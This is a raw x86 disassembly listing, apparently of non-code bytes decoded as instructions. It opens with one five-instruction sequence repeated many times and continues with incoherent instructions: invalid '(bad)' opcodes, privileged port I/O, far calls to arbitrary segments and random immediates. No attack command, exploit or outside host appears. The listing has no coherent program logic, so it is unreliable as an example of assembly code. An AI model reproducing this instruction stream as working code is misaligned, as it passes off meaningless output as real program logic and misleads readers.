  423255:	ficomp DWORD PTR [ecx-0x1365dae]
  42325b:	xchg   BYTE PTR [eax],al
  42325d:	outs   dx,DWORD PTR ds:[esi]
  42325e:	fcmovb st,st(4)
  423260:	aad    0x8f
  423262:	ficomp DWORD PTR [ecx-0x1365dae]
  423268:	xchg   BYTE PTR [eax],al
  42326a:	outs   dx,DWORD PTR ds:[esi]
  42326b:	fcmovb st,st(4)
  42326d:	aad    0x8f
  42326f:	ficomp DWORD PTR [ecx-0x1365dae]
  423275:	xchg   BYTE PTR [eax],al
  423277:	outs   dx,DWORD PTR ds:[esi]
  423278:	fcmovb st,st(4)
  42327a:	aad    0x8f
  42327c:	ficomp DWORD PTR [ecx-0x1365dae]
  423282:	xchg   BYTE PTR [eax],al
  423284:	outs   dx,DWORD PTR ds:[esi]
  423285:	fcmovb st,st(4)
  423287:	aad    0x8f
  423289:	ficomp DWORD PTR [ecx-0x1365dae]
  42328f:	xchg   BYTE PTR [eax],al
  423291:	outs   dx,DWORD PTR ds:[esi]
  423292:	fcmovb st,st(4)
  423294:	aad    0x8f
  423296:	ficomp DWORD PTR [ecx-0x1365dae]
  42329c:	xchg   BYTE PTR [eax],al
  42329e:	outs   dx,DWORD PTR ds:[esi]
  42329f:	fcmovb st,st(4)
  4232a1:	aad    0x8f
  4232a3:	ficomp DWORD PTR [ecx-0x1365dae]
  4232a9:	xchg   BYTE PTR [eax],al
  4232ab:	outs   dx,DWORD PTR ds:[esi]
  4232ac:	fcmovb st,st(4)
  4232ae:	aad    0x8f
  4232b0:	ficomp DWORD PTR [ecx-0x1365dae]
  4232b6:	xchg   BYTE PTR [eax],al
  4232b8:	outs   dx,DWORD PTR ds:[esi]
  4232b9:	fcmovb st,st(4)
  4232bb:	aad    0x8f
  4232bd:	ficomp DWORD PTR [ecx-0x1365dae]
  4232c3:	xchg   BYTE PTR [eax],al
  4232c5:	outs   dx,DWORD PTR ds:[esi]
  4232c6:	fcmovb st,st(4)
  4232c8:	aad    0x8f
  4232ca:	ficomp DWORD PTR [ecx-0x1365dae]
  4232d0:	xchg   BYTE PTR [eax],al
  4232d2:	outs   dx,DWORD PTR ds:[esi]
  4232d3:	fcmovb st,st(4)
  4232d5:	aad    0x8f
  4232d7:	ficomp DWORD PTR [ecx-0x1365dae]
  4232dd:	xchg   BYTE PTR [eax],al
  4232df:	outs   dx,DWORD PTR ds:[esi]
  4232e0:	fcmovb st,st(4)
  4232e2:	aad    0x8f
  4232e4:	ficomp DWORD PTR [ecx-0x1365dae]
  4232ea:	xchg   BYTE PTR [eax],al
  4232ec:	outs   dx,DWORD PTR ds:[esi]
  4232ed:	fcmovb st,st(4)
  4232ef:	aad    0x8f
  4232f1:	ficomp DWORD PTR [ecx-0x1365dae]
  4232f7:	xchg   BYTE PTR [eax],al
  4232f9:	outs   dx,DWORD PTR ds:[esi]
  4232fa:	fcmovb st,st(4)
  4232fc:	aad    0x8f
  4232fe:	ficomp DWORD PTR [ecx-0x1365dae]
  423304:	xchg   BYTE PTR [eax],al
  423306:	outs   dx,DWORD PTR ds:[esi]
  423307:	fcmovb st,st(4)
  423309:	aad    0x8f
  42330b:	ficomp DWORD PTR [ecx-0x1365dae]
  423311:	xchg   BYTE PTR [eax],al
  423313:	outs   dx,DWORD PTR ds:[esi]
  423314:	fcmovb st,st(4)
  423316:	aad    0x8f
  423318:	ficomp DWORD PTR [ecx-0x1365dae]
  42331e:	xchg   BYTE PTR [eax],al
  423320:	outs   dx,DWORD PTR ds:[esi]
  423321:	fcmovb st,st(4)
  423323:	aad    0x8f
  423325:	ficomp DWORD PTR [ecx-0x1365dae]
  42332b:	xchg   BYTE PTR [eax],al
  42332d:	outs   dx,DWORD PTR ds:[esi]
  42332e:	fcmovb st,st(4)
  423330:	aad    0x8f
  423332:	ficomp DWORD PTR [ecx-0x1365dae]
  423338:	xchg   BYTE PTR [eax],al
  42333a:	outs   dx,DWORD PTR ds:[esi]
  42333b:	fcmovb st,st(4)
  42333d:	aad    0x8f
  42333f:	ficomp DWORD PTR [ecx-0x1365dae]
  423345:	xchg   BYTE PTR [eax],al
  423347:	outs   dx,DWORD PTR ds:[esi]
  423348:	fcmovb st,st(4)
  42334a:	aad    0x8f
  42334c:	ficomp DWORD PTR [ecx-0x1365dae]
  423352:	xchg   BYTE PTR [eax],al
  423354:	outs   dx,DWORD PTR ds:[esi]
  423355:	fcmovb st,st(4)
  423357:	aad    0x8f
  423359:	ficomp DWORD PTR [ecx-0x1365dae]
  42335f:	xchg   BYTE PTR [eax],al
  423361:	outs   dx,DWORD PTR ds:[esi]
  423362:	fcmovb st,st(4)
  423364:	aad    0x8f
  423366:	ficomp DWORD PTR [ecx-0x1365dae]
  42336c:	xchg   BYTE PTR [eax],al
  42336e:	outs   dx,DWORD PTR ds:[esi]
  42336f:	fcmovb st,st(4)
  423371:	aad    0x8f
  423373:	ficomp DWORD PTR [ecx-0x1365dae]
  423379:	xchg   BYTE PTR [eax],al
  42337b:	outs   dx,DWORD PTR ds:[esi]
  42337c:	fcmovb st,st(4)
  42337e:	aad    0x8f
  423380:	ficomp DWORD PTR [ecx-0x1365dae]
  423386:	xchg   BYTE PTR [eax],al
  423388:	outs   dx,DWORD PTR ds:[esi]
  423389:	fcmovb st,st(4)
  42338b:	aad    0x8f
  42338d:	ficomp DWORD PTR [ecx-0x1365dae]
  423393:	xchg   BYTE PTR [eax],al
  423395:	outs   dx,DWORD PTR ds:[esi]
  423396:	fcmovb st,st(4)
  423398:	aad    0x8f
  42339a:	ficomp DWORD PTR [ecx-0x1365dae]
  4233a0:	xchg   BYTE PTR [eax],al
  4233a2:	outs   dx,DWORD PTR ds:[esi]
  4233a3:	fcmovb st,st(4)
  4233a5:	aad    0x8f
  4233a7:	ficomp DWORD PTR [ecx-0x1365dae]
  4233ad:	xchg   BYTE PTR [eax],al
  4233af:	outs   dx,DWORD PTR ds:[esi]
  4233b0:	fcmovb st,st(4)
  4233b2:	aad    0x8f
  4233b4:	ficomp DWORD PTR [ecx-0x1365dae]
  4233ba:	xchg   BYTE PTR [eax],al
  4233bc:	outs   dx,DWORD PTR ds:[esi]
  4233bd:	fcmovb st,st(4)
  4233bf:	aad    0x8f
  4233c1:	ficomp DWORD PTR [ecx-0x13cb3eb]
  4233c7:	test   eax,0xc4ca6f00
  4233cc:	aad    0xa5
  4233ce:	js     0x423413
  4233d0:	and    eax,esp
  4233d2:	rcr    DWORD PTR ss:[eax],cl
  4233d5:	xchg   DWORD PTR [edi],edi
  4233d7:	aaa    
  4233d8:	repnz cmp eax,0x340c6e9c
  4233de:	ror    DWORD PTR [ebp-0x5c],cl
  4233e1:	xchg   ebp,eax
  4233e2:	mov    cl,0xd8
  4233e4:	int3   
  4233e5:	test   eax,0x5f5b0531
  4233ea:	jl     0x4233ac
  4233ec:	pop    ecx
  4233ed:	sar    DWORD PTR [edi-0x2c94dfcd],0xf7
  4233f4:	(bad)  
  4233f5:	std    
  4233f6:	ds (bad) 
  4233f9:	cwde   
  4233fa:	xchg   ebx,eax
  4233fb:	das    
  4233fc:	xor    dl,BYTE PTR [edx+0x7]
  4233ff:	shl    BYTE PTR [edi+ebp*8-0x36],1
  423403:	ret    0xb374
  423406:	es xchg edi,eax
  423408:	daa    
  423409:	ins    BYTE PTR es:[edi],dx
  42340a:	mov    BYTE PTR [eax-0x18],ah
  42340d:	adc    al,BYTE PTR [edx]
  42340f:	mov    fs,WORD PTR [edi+0x64]
  423412:	rol    BYTE PTR [edi+eiz*2],cl
  423415:	test   BYTE PTR [eax-0x53ac215a],ah
  42341b:	mov    al,0xc6
  42341d:	in     al,dx
  42341e:	dec    edi
  42341f:	adc    esp,DWORD PTR [edi+0x29]
  423422:	sbb    eax,0xc89028d8
  423427:	pushf  
  423428:	xor    BYTE PTR [esi-0x7e5027dd],0x0
  42342f:	pusha  
  423430:	not    DWORD PTR [edx-0x30]
  423433:	mov    eax,ds:0x7193983
  423438:	xchg   edx,eax
  423439:	ret    0xb51f
  42343c:	(bad)
  42343f:	xor    edx,DWORD PTR [esi+ebx*4]
  423442:	or     al,0x2
  423444:	mov    dl,0xf2
  423446:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423447:	and    dh,BYTE PTR [ebp+0x18]
  42344a:	inc    esp
  42344b:	lea    ecx,ds:0xf788f6b6
  423451:	dec    edx
  423452:	add    BYTE PTR [ebx+0x3ecea4ac],0x3e
  423459:	pop    ecx
  42345a:	or     BYTE PTR [esi-0x4564cea5],dl
  423460:	js     0x423465
  423462:	cmp    al,0xd6
  423464:	sub    eax,0xee729449
  423469:	repnz ds pop edx
  42346c:	in     eax,dx
  42346d:	daa    
  42346e:	cdq    
  42346f:	pusha  
  423470:	in     eax,0x32
  423472:	inc    esp
  423473:	imul   esi,DWORD PTR [ebx],0x3a
  423476:	jb     0x42349b
  423478:	jle    0x42341b
  42347a:	sub    al,0x2
  42347c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42347d:	out    dx,al
  42347e:	sub    eax,0x5b3ede05
  423483:	enter  0x15c,0x68
  423487:	cmp    al,0x3f
  423489:	test   DWORD PTR [eax],0xa0f66a9
  42348f:	jbe    0x4234b9
  423491:	or     cl,BYTE PTR [ebp+0x4c]
  423494:	pop    es
  423495:	jmp    0x4234bb
  423497:	pop    esi
  423498:	fist   DWORD PTR [ebx-0x12]
  42349b:	idiv   BYTE PTR [ecx]
  42349d:	in     al,dx
  42349e:	push   0xfffffff6
  4234a0:	inc    ebx
  4234a1:	inc    eax
  4234a2:	aam    0x85
  4234a4:	rcl    ah,cl
  4234a6:	cmp    eax,0xb645e94b
  4234ab:	mov    BYTE PTR [esi],cl
  4234ad:	(bad)  
  4234ae:	imul   ebx,DWORD PTR [edx],0x44475d58
  4234b4:	adc    DWORD PTR [edi+0x11],0xe031283d
  4234bb:	jns    0x423532
  4234bd:	std    
  4234be:	frstor [ebx+0x3c]
  4234c1:	popa   
  4234c2:	ret    0xc154
  4234c5:	inc    ebp
  4234c6:	add    BYTE PTR [ecx],dh
  4234c8:	mov    esp,0x2b09fdb4
  4234cd:	les    edx,FWORD PTR ds:0xbcbd0f81
  4234d3:	fistp  WORD PTR ds:0x8069e205
  4234d9:	imul   dh
  4234db:	or     eax,0x4b1eff5a
  4234e0:	mov    ch,0x78
  4234e2:	repnz mov ebp,es
  4234e5:	sbb    bh,ch
  4234e7:	js     0x423532
  4234e9:	sub    al,dh
  4234eb:	xor    bl,BYTE PTR [edx]
  4234ed:	fwait
  4234ee:	scas   al,BYTE PTR es:[edi]
  4234ef:	push   esp
  4234f0:	push   esp
  4234f1:	call   0x6cdd:0xbe9ee255
  4234f8:	bound  esp,QWORD PTR [ebx]
  4234fa:	fadd   QWORD PTR [eax]
  4234fc:	pop    edx
  4234fd:	lock sbb ecx,DWORD PTR [edi+edi*8-0x5f0b53bd]
  423505:	gs cmp eax,eax
  423508:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423509:	push   esp
  42350a:	or     ch,BYTE PTR [eax]
  42350c:	add    DWORD PTR [eax+0x3d],0x8125ac73
  423513:	(bad)  
  423514:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423515:	inc    edi
  423516:	out    0x64,eax
  423518:	adc    DWORD PTR [edx-0x6b],eax
  42351b:	mov    ecx,0xf1283791
  423520:	jl     0x42358a
  423522:	in     al,dx
  423523:	push   ebp
  423524:	loopne 0x423572
  423526:	inc    edi
  423527:	fs stc 
  423529:	aaa    
  42352a:	addr16 and al,0xb9
  42352d:	aas    
  42352e:	jns    0x42351a
  423530:	lock inc ecx
  423532:	xchg   ecx,eax
  423533:	xor    eax,0x76d1839b
  423538:	mov    al,BYTE PTR [edx+0x37a38a46]
  42353e:	push   esi
  42353f:	inc    ebp
  423540:	pusha  
  423541:	icebp  
  423542:	scas   al,BYTE PTR es:[edi]
  423543:	cli    
  423544:	mov    edx,0x38490e1
  423549:	outs   dx,BYTE PTR ds:[esi]
  42354a:	test   al,0xaa
  42354c:	shl    BYTE PTR [edi-0x56],cl
  42354f:	and    eax,0x90a6f9be
  423554:	daa    
  423555:	or     ecx,DWORD PTR [eax-0x507fec11]
  42355b:	les    edi,FWORD PTR ds:0xe80c7b4e
  423561:	pop    ebp
  423562:	push   eax
  423563:	mov    ds:0x9b077ec4,al
  423568:	jecxz  0x423518
  42356a:	addr16 push ebx
  42356c:	popf   
  42356d:	repz jb 0x42351f
  423570:	xlat   BYTE PTR ds:[ebx]
  423571:	inc    ebp
  423572:	jae    0x42355f
  423574:	xor    DWORD PTR [ebx],edx
  423576:	add    DWORD PTR [ebx],eax
  423578:	xchg   ebx,eax
  423579:	push   eax
  42357a:	daa    
  42357b:	adc    eax,0xc98e35e2
  423580:	or     ebx,DWORD PTR [ecx-0x52]
  423583:	add    eax,0x602376f0
  423588:	sub    eax,DWORD PTR [eax+0x70]
  42358b:	sbb    al,0xb9
  42358d:	pop    eax
  42358e:	jb     0x423543
  423590:	enter  0x6a14,0xf1
  423594:	inc    ebx
  423595:	icebp  
  423596:	adc    cl,BYTE PTR [esi+0x46]
  423599:	shl    DWORD PTR [esi+0x5b],cl
  42359c:	adc    BYTE PTR [edx-0x18],0x33
  4235a0:	pushf  
  4235a1:	sub    dl,bl
  4235a3:	xchg   dl,ch
  4235a5:	inc    ebx
  4235a6:	xlat   BYTE PTR ds:[ebx]
  4235a7:	xor    BYTE PTR [ebx+0x5c],0xdd
  4235ab:	cs dec esp
  4235ad:	jl     0x423530
  4235af:	into   
  4235b0:	pop    esi
  4235b1:	mov    dl,0xf6
  4235b3:	xor    ebp,edi
  4235b5:	mov    esp,0x53a2641d
  4235ba:	mov    edx,0x34d79e80
  4235bf:	mov    bh,0xa5
  4235c1:	jbe    0x423634
  4235c3:	and    ah,BYTE PTR [edi+0x6]
  4235c6:	cdq    
  4235c7:	out    0x76,al
  4235c9:	dec    esp
  4235ca:	cmc    
  4235cb:	out    dx,al
  4235cc:	mov    esi,0x1bbde909
  4235d1:	mov    ebx,0x1a522f72
  4235d6:	pushf  
  4235d7:	in     al,dx
  4235d8:	cmp    eax,DWORD PTR [edi]
  4235da:	or     ah,BYTE PTR [edx-0x68]
  4235dd:	sub    eax,0xfc271590
  4235e2:	push   eax
  4235e3:	jnp    0x42365b
  4235e5:	cmp    BYTE PTR [ecx],bl
  4235e7:	sbb    BYTE PTR [esi],al
  4235e9:	push   edi
  4235ea:	push   ss
  4235eb:	in     al,dx
  4235ec:	ds (bad) 
  4235ef:	das    
  4235f0:	ror    DWORD PTR [ebp-0x577f20c2],0xcc
  4235f7:	add    eax,0x92a960d8
  4235fc:	jbe    0x42359a
  4235fe:	(bad)  
  4235ff:	pop    ebp
  423600:	imul   edx,DWORD PTR [ebx-0x8],0xffffff97
  423604:	jg     0x423609
  423606:	jle    0x4235b0
  423608:	sbb    eax,0x9b33860d
  42360d:	mov    ecx,0xb1d5ba7d
  423612:	and    DWORD PTR [ecx],esi
  423614:	push   ds
  423615:	mov    dl,0x42
  423617:	int3   
  423618:	xchg   esp,eax
  423619:	(bad)  
  42361a:	and    al,0xca
  42361c:	jb     0x423699
  42361e:	outs   dx,BYTE PTR ds:[esi]
  42361f:	cmp    eax,0xf2f4eb13
  423624:	out    0xfc,eax
  423626:	jecxz  0x423669
  423628:	mov    esp,0xffb85803
  42362d:	inc    esi
  42362e:	push   esi
  42362f:	or     BYTE PTR [edx],dh
  423631:	shl    DWORD PTR [ebp+0x1f60606f],cl
  423637:	pop    ebx
  423638:	inc    BYTE PTR [ecx+ebx*1]
  42363b:	xchg   ecx,eax
  42363c:	and    BYTE PTR [esi-0x6587ff1a],cl
  423642:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423643:	sbb    esi,esi
  423645:	xchg   ebx,eax
  423646:	test   BYTE PTR [ecx],bh
  423648:	aam    0xe9
  42364a:	dec    edx
  42364b:	div    DWORD PTR [ebx+0x29]
  42364e:	dec    edx
  42364f:	les    esp,FWORD PTR [esi-0xf]
  423652:	push   0xfec88ef6
  423657:	int    0x4c
  423659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42365a:	jnp    0x4236b4
  42365c:	xor    ch,BYTE PTR [ebx-0x49]
  42365f:	push   esp
  423660:	mov    dl,0xff
  423662:	mov    ch,0x40
  423664:	sahf   
  423665:	jg     0x423607
  423667:	xchg   esp,eax
  423668:	dec    esp
  423669:	rcl    DWORD PTR [ecx+0x40],1
  42366c:	fdivr  st(6),st
  42366e:	push   esp
  42366f:	and    BYTE PTR [edi],ch
  423671:	or     ecx,DWORD PTR ds:0xaab66682
  423677:	pop    edx
  423678:	jge    0x423638
  42367a:	ret    
  42367b:	retf   0x6e55
  42367e:	pop    esp
  42367f:	aas    
  423680:	out    dx,eax
  423681:	dec    ebx
  423682:	inc    ecx
  423683:	pop    eax
  423684:	adc    ecx,DWORD PTR [ebp+0x316ce72b]
  42368a:	daa    
  42368b:	call   0x9074aa48
  423690:	push   ds
  423691:	gs cmp ah,ah
  423694:	inc    ebp
  423695:	push   ss
  423696:	mov    WORD PTR [esi+0x4],?
  423699:	std    
  42369a:	fwait
  42369b:	out    dx,al
  42369c:	out    0x44,eax
  42369e:	lods   eax,DWORD PTR ds:[esi]
  42369f:	add    DWORD PTR [ebx+0x2266c12f],ebp
  4236a5:	adc    BYTE PTR [ebp-0xc],0x4e
  4236a9:	pop    ebx
  4236aa:	push   0x6
  4236ac:	jmp    0x4236fa
  4236ae:	call   0x117d:0x4302982a
  4236b5:	mov    esp,0x53c205e5
  4236ba:	dec    ebx
  4236bb:	inc    ecx
  4236bc:	dec    ebx
  4236bd:	xchg   edi,eax
  4236be:	(bad)  
  4236bf:	call   0x8542:0x2a1b383
  4236c6:	xor    al,0x7
  4236c8:	adc    eax,0x9a36d74
  4236cd:	push   ebp
  4236ce:	rcr    ch,0xc8
  4236d1:	lock repz pop es
  4236d4:	(bad)  [ebp-0x36]
  4236d7:	rcr    BYTE PTR [ecx],cl
  4236d9:	(bad)  
  4236dc:	or     eax,DWORD PTR [ecx]
  4236de:	xchg   ebp,eax
  4236df:	jl     0x4236de
  4236e1:	cmp    BYTE PTR cs:0x4dc162ed,dh
  4236e8:	fldcw  WORD PTR [edx]
  4236ea:	sbb    esi,DWORD PTR [ebx]
  4236ec:	mov    ecx,0x59030092
  4236f1:	enter  0x2726,0x64
  4236f5:	lds    edi,FWORD PTR [esp+eax*4+0x33]
  4236f9:	data16 int 0x98
  4236fc:	rol    ebx,cl
  4236fe:	xor    dh,BYTE PTR [edi]
  423700:	mov    edx,edi
  423702:	cmp    al,0xca
  423704:	push   edx
  423705:	jb     0x4236ff
  423707:	cs (bad) 
  423709:	cdq    
  42370a:	and    dl,0x32
  42370d:	pushf  
  42370e:	jmp    0x4236c7
  423710:	popf   
  423711:	inc    eax
  423712:	mov    esp,0x3cc145de
  423717:	jnp    0x42370c
  423719:	int3   
  42371a:	xchg   edi,eax
  42371b:	add    DWORD PTR [edx-0x56],esp
  42371e:	mov    cl,0x59
  423720:	xor    eax,0x4d714dd3
  423725:	fstp   DWORD PTR [edx]
  423727:	or     BYTE PTR [ebp+0x1289bc15],dl
  42372d:	ins    BYTE PTR es:[edi],dx
  42372e:	adc    DWORD PTR [bx+di+0x6d],edi
  423732:	in     al,dx
  423733:	rcl    BYTE PTR [ecx+0x60],0x27
  423737:	(bad)  
  423739:	ins    BYTE PTR es:[edi],dx
  42373a:	and    ecx,eax
  42373c:	inc    ecx
  42373d:	pop    ecx
  42373e:	ret    0x1e46
  423741:	cmp    al,0xa6
  423743:	jl     0x42373b
  423745:	ret    
  423746:	xor    DWORD PTR [edi+0x726222a],ebx
  42374c:	add    cl,BYTE PTR [eax+0x12bc03bc]
  423752:	dec    ecx
  423753:	pop    ebx
  423754:	mov    ds:0x30b1b646,eax
  423759:	jmp    0x42372e
  42375b:	(bad)
  42375e:	mov    ebp,0x88e949f3
  423763:	add    BYTE PTR [ecx],0x26
  423766:	xchg   ebx,eax
  423767:	fisub  WORD PTR [edi-0x26]
  42376a:	jl     0x423763
  42376c:	in     al,dx
  42376d:	xor    ecx,esi
  42376f:	xchg   esi,edx
  423771:	and    ebx,DWORD PTR [ebx+eiz*1]
  423774:	or     al,0xfa
  423776:	ins    DWORD PTR es:[edi],dx
  423777:	imul   sp,WORD PTR [eax+0x29cfac93],0x2b30
  423780:	iret   
  423781:	mov    WORD PTR ds:0xb2c6ba5d,gs
  423787:	jmp    0x230fb3bf
  42378c:	aad    0x94
  42378e:	dec    ebp
  42378f:	push   ds
  423790:	adc    esi,DWORD PTR [ecx+ebp*4+0x56]
  423794:	fwait
  423795:	or     edi,DWORD PTR [esi+0x3b117c9d]
  42379b:	cmc    
  42379c:	cmp    edx,DWORD PTR [ebx]
  42379e:	xor    bl,BYTE PTR [edx-0x7149200c]
  4237a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237a5:	and    DWORD PTR [esi+0x14],esi
  4237a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237a9:	lds    edx,FWORD PTR [esi+0x12fb2e64]
  4237af:	or     esi,DWORD PTR [edx+edi*2-0x7c15fc8f]
  4237b6:	arpl   si,cx
  4237b8:	add    DWORD PTR [edx+0x791dfcd2],ebx
  4237be:	jnp    0x423751
  4237c0:	xchg   esp,eax
  4237c1:	std    
  4237c2:	mov    esp,0x462997ca
  4237c7:	inc    esi
  4237c8:	fimul  WORD PTR [eax]
  4237ca:	call   0xca78:0x6745cb32
  4237d1:	push   ecx
  4237d2:	sahf   
  4237d3:	outs   dx,DWORD PTR ds:[si]
  4237d5:	pop    ss
  4237d6:	or     BYTE PTR ds:0x5320590f,ch
  4237dc:	push   eax
  4237dd:	sub    DWORD PTR ds:0xd8335910,ebx
  4237e3:	scas   al,BYTE PTR es:[edi]
  4237e4:	shl    BYTE PTR [ecx+eax*1],cl
  4237e7:	sahf   
  4237e8:	xor    eax,0x704c04a3
  4237ed:	mov    esp,0x8acf3c9c
  4237f2:	mov    esp,0xb4b9e616
  4237f7:	imul   edx,esi,0xf1ff551b
  4237fd:	add    ah,BYTE PTR [edx+0x4d852cfe]
  423803:	dec    ebp
  423804:	in     al,dx
  423805:	mov    eax,0x5cb9796b
  42380a:	fadd   QWORD PTR [edi+ebp*1+0x28]
  42380e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42380f:	mov    al,ds:0x206810f0
  423814:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423815:	clc    
  423816:	pop    es
  423817:	xlat   BYTE PTR ds:[ebx]
  423818:	or     DWORD PTR [eax+0x6974d92a],0xa778116b
  423822:	pop    ecx
  423823:	ds lea eax,cs:[edi+0x47a68c8]
  42382b:	pop    ecx
  42382c:	cmp    DWORD PTR ds:0x7cd654e8,0x219c8bb
  423836:	jg     0x4237ff
  423838:	dec    ebp
  423839:	fcomp  DWORD PTR [ecx-0x16b0ddf6]
  42383f:	daa    
  423840:	test   eax,0x92bdf534
  423845:	mov    al,0x70
  423847:	or     BYTE PTR [edi+ecx*8+0x284dc914],0xd2
  42384f:	mov    eax,ds:0xb6bd7fc0
  423854:	push   es
  423855:	inc    esi
  423856:	mov    dl,0x44
  423858:	jbe    0x4237ea
  42385a:	retf   0x6572
  42385d:	xchg   ebx,eax
  42385e:	aam    0xae
  423860:	fs mov ecx,0x3f8c01cc
  423866:	xor    DWORD PTR [ebx],edi
  423868:	jecxz  0x423818
  42386a:	pop    ebx
  42386b:	(bad)  
  42386d:	in     al,0xe5
  42386f:	push   cs
  423870:	bound  edi,QWORD PTR [edi+0x79]
  423873:	push   ebp
  423874:	dec    edi
  423875:	jmp    0x2d1b:0x436a8ee6
  42387c:	xchg   ecx,eax
  42387d:	and    BYTE PTR [ebp-0x74],cl
  423880:	leave  
  423881:	in     eax,0x5f
  423883:	fnstenv [edx-0x67]
  423886:	sti    
  423887:	inc    esi
  423888:	jecxz  0x423906
  42388a:	xlat   BYTE PTR ds:[ebx]
  42388b:	addr16 retf 
  42388d:	(bad)  
  42388e:	dec    eax
  42388f:	jno    0x423827
  423891:	sar    cl,cl
  423893:	(bad)  
  423894:	push   ebp
  423895:	push   0x42
  423897:	adc    ebp,esi
  423899:	dec    esi
  42389a:	icebp  
  42389b:	adc    esp,0x43
  42389e:	mov    esi,0xd0165c2
  4238a3:	cwde   
  4238a4:	jp     0x4238f9
  4238a6:	xchg   ebp,eax
  4238a7:	add    edx,DWORD PTR ds:0xafb0e38d
  4238ad:	in     eax,dx
  4238ae:	push   eax
  4238af:	xor    eax,0xf373443
  4238b4:	dec    edx
  4238b5:	dec    ebx
  4238b6:	add    ecx,DWORD PTR [edi+0x58c60627]
  4238bc:	int3   
  4238bd:	lahf   
  4238be:	or     eax,DWORD PTR [eax+esi*2]
  4238c1:	add    DWORD PTR [ebp+0x6e24cc11],eax
  4238c7:	not    ecx
  4238c9:	call   0xcbac4de6
  4238ce:	sbb    al,0x5
  4238d0:	pop    ebp
  4238d1:	and    eax,0xb1db8d4e
  4238d6:	jecxz  0x423889
  4238d8:	stos   DWORD PTR es:[edi],eax
  4238d9:	repnz adc al,0x16
  4238dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238dd:	ins    BYTE PTR es:[edi],dx
  4238de:	cli    
  4238df:	gs fwait
  4238e1:	push   cs
  4238e2:	jb     0x4238b8
  4238e4:	cld    
  4238e5:	fadd   DWORD PTR [edi+0x40006643]
  4238eb:	mov    dl,0xce
  4238ed:	ins    DWORD PTR es:[edi],dx
  4238ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238ef:	pop    ebp
  4238f0:	fistp  DWORD PTR [edx+0x183e3de4]
  4238f6:	fsub   QWORD PTR [ebp-0x4ae3a048]
  4238fc:	jle    0x42393e
  4238fe:	repnz fdiv DWORD PTR [edx+0x1caf6428]
  423905:	or     DWORD PTR [edx+ebx*4-0x3bf6b791],ebp
  42390c:	test   BYTE PTR [esi-0x354fe94f],al
  423912:	jne    0x423990
  423914:	fs mov ebp,0x6a44a902
  42391a:	test   edx,ebx
  42391c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42391d:	dec    esi
  42391e:	inc    ebp
  42391f:	pop    edi
  423920:	jg     0x423974
  423922:	cdq    
  423923:	iret   
  423924:	pop    edx
  423925:	mov    BYTE PTR [ebp+0x7c],bl
  423928:	jno    0x423964
  42392a:	mov    bl,0x39
  42392c:	cli    
  42392d:	sub    BYTE PTR [ebp-0x51],cl
  423930:	ja     0x4238cd
  423932:	stc    
  423933:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423934:	sub    esp,DWORD PTR [esi]
  423936:	cli    
  423937:	in     eax,0x74
  423939:	push   ecx
  42393a:	add    DWORD PTR [ebp-0x53],esp
  42393d:	mov    bh,0x64
  42393f:	cdq    
  423940:	das    
  423941:	addr16 mov dh,0x75
  423944:	pop    es
  423945:	in     al,dx
  423946:	pop    edx
  423947:	outs   dx,DWORD PTR ds:[esi]
  423948:	pop    edx
  423949:	inc    ebp
  42394a:	push   esi
  42394b:	add    BYTE PTR [ebx+0x45c9fd53],al
  423951:	mov    ds:0xa903600f,al
  423956:	inc    ebp
  423957:	pop    esi
  423958:	mov    BYTE PTR [esi+0x5e],bh
  42395b:	cli    
  42395c:	fs ins BYTE PTR es:[edi],dx
  42395e:	xor    dh,BYTE PTR [ecx]
  423960:	imul   ebx,esp,0x5d
  423963:	popf   
  423964:	and    DWORD PTR ds:0x51b2ee66,esp
  42396a:	pusha  
  42396b:	cmp    ch,BYTE PTR [esp+edi*4-0x56]
  42396f:	lock mov ss,ebp
  423972:	scas   al,BYTE PTR es:[edi]
  423973:	xchg   BYTE PTR [ebx-0x1192871a],ah
  423979:	push   es
  42397a:	ret    0x354f
  42397d:	mov    DWORD PTR [esi],edi
  42397f:	div    BYTE PTR [eax+0x60]
  423982:	(bad)  
  423984:	or     eax,0x663e776f
  423989:	ss xor eax,0xfcd156fc
  42398f:	mov    edi,esp
  423991:	add    DWORD PTR [edx],esp
  423993:	sti    
  423994:	(bad)  
  423995:	mov    cl,0x7f
  423997:	lods   eax,DWORD PTR ds:[esi]
  423998:	dec    eax
  423999:	inc    ebp
  42399a:	xor    eax,0x3e72fca1
  42399f:	mov    ch,0x50
  4239a1:	push   esi
  4239a2:	frstor [ebp+0x2269ca7f]
  4239a8:	or     al,BYTE PTR ds:[ebp-0x1b13d63d]
  4239af:	pushf  
  4239b0:	fs pop edi
  4239b2:	hlt    
  4239b3:	(bad)  
  4239b4:	and    ecx,DWORD PTR [eax-0x5ad70100]
  4239ba:	pop    esi
  4239bb:	adc    eax,0x62c11604
  4239c0:	out    dx,eax
  4239c1:	mov    esi,edx
  4239c3:	in     eax,0xd
  4239c5:	aas    
  4239c6:	sbb    DWORD PTR [ebx+edi*8+0x140fa384],ecx
  4239cd:	mov    bl,0xf8
  4239cf:	or     al,0x62
  4239d1:	and    ebx,DWORD PTR [edx+eiz*8-0x10]
  4239d5:	fs xchg esi,eax
  4239d7:	push   edx
  4239d8:	push   cs
  4239d9:	jmp    0x2ff9b7d
  4239de:	loop   0x4239c9
  4239e0:	pop    edx
  4239e1:	adc    ecx,ebx
  4239e3:	data16 and bh,BYTE PTR [edx-0x4a]
  4239e7:	out    0x94,al
  4239e9:	pop    eax
  4239ea:	jge    0x4239b4
  4239ec:	int3   
  4239ed:	mov    dh,0x7c
  4239ef:	jbe    0x423991
  4239f1:	xchg   ebx,eax
  4239f2:	mov    edi,DWORD PTR [edi+0x455a56e]
  4239f8:	cmp    eax,DWORD PTR [esi-0x70e84b26]
  4239fe:	xchg   ecx,eax
